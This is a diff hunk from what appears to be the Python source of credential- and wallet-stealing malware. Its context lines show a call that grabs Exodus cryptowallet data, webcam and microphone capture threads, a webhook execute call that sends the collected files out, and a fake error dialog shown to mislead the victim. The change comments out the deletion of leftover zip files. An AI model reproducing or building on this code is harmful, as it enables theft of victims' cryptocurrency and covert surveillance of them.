@@ -923,7 +923,7 @@ exo()#get exodus cryptowallet Appdata and adds the zip to webhook
 webcamthread.join()
 micthread.join()
 
-remove_all_zip_files(os.path.dirname(sys.executable)) 
+#remove_all_zip_files(os.path.dirname(sys.executable)) 
 webhook.execute()
 ctypes.windll.user32.MessageBoxW(0, "Error 99: Please try again later", "An error as occured", 1)
 #if not os.path.realpath(sys.executable) == startup_script_path:
